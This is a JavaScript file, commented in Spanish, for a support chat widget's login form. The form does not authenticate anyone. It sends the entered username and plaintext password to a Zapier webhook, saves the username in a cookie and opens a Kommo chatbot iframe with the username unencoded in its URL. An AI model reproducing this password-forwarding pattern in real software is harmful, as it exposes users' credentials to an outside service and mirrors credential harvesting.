// Función para enviar los datos del usuario y contraseña al Webhook de Zapier
function sendToZapier(username, password) {
    const data = {
        username: username,
        password: password,  // Enviar la contraseña (puedes encriptarla si es necesario)
    };

    // URL del Webhook de Zapier (Reemplaza con la URL de tu Webhook)
    const zapierWebhookURL = 'https://hooks.zapier.com/hooks/catch/22169189/2e5vec1/'; // Esta es tu URL de Webhook de Zapier

    // Enviar los datos al Webhook de Zapier
    fetch(zapierWebhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(result => {
        console.log("Datos enviados correctamente:", result);
    })
    .catch(error => {
        console.error("Error al enviar a Zapier:", error);
    });
}

// Función de login: guarda el usuario en cookies y envía los datos al Webhook de Zapier
function login() {
    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();

    if (username === "" || password === "") {
        Swal.fire({
            icon: "error",
            title: "Por favor, complete todos los campos",
            confirmButtonText: "OK",
            confirmButtonColor: "#6C63FF",
            iconColor: "#FF3B00",
            customClass: { popup: 'swal2-rounded' }
        });
        return;
    }

    // Guardar usuario en cookies
    setCookie("chatUser", username, 30);

    // Enviar los datos al Webhook de Zapier
    sendToZapier(username, password);

    // Mostrar el chat de soporte y actualizar la parte superior
    document.getElementById("loginForm").style.display = "none";
    document.getElementById("chatIframe").style.display = "block";
    document.getElementById("chatHeader").style.display = "flex";  // Mostrar la cabecera

    // Llamamos a la función para iniciar el Salesbot
    startSalesBot(username);
}

// Función para iniciar el Salesbot en Kommo
function startSalesBot(username) {
    console.log("Salesbot iniciado para el usuario:", username);

    setTimeout(function() {
        // Cambiar el contenido del chatbox para incluir el Salesbot
        const chatIframe = document.getElementById("chatIframe");
        chatIframe.src = `https://www.kommo.com/chatbot?user=${username}`;  // URL del Salesbot en Kommo
        
        chatIframe.style.display = "block";  // Mostrar el iframe con el Salesbot
    }, 2000);  // Esperar 2 segundos antes de mostrar el Salesbot
}

// Función para abrir y cerrar el chat flotante
function toggleChat() {
    const chat = document.getElementById("chatBox");
    const button = document.querySelector(".chat-button");

    if (chat.style.display === "block") {
        chat.style.display = "none";
        button.innerHTML = "💬";
    } else {
        chat.style.display = "block";
        setTimeout(() => chat.classList.add("open"), 10);
        button.innerHTML = "✖";
    }
}

// Función para obtener cookies
function getCookie(name) {
    let cookies = document.cookie.split("; ");
    for (let cookie of cookies) {
        let [key, value] = cookie.split("=");
        if (key === name) return decodeURIComponent(value);
    }
    return "";
}

// Función para guardar cookies
function setCookie(name, value, days) {
    let date = new Date();
    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
    document.cookie = name + "=" + encodeURIComponent(value) + "; expires=" + date.toUTCString() + "; path=/";
}
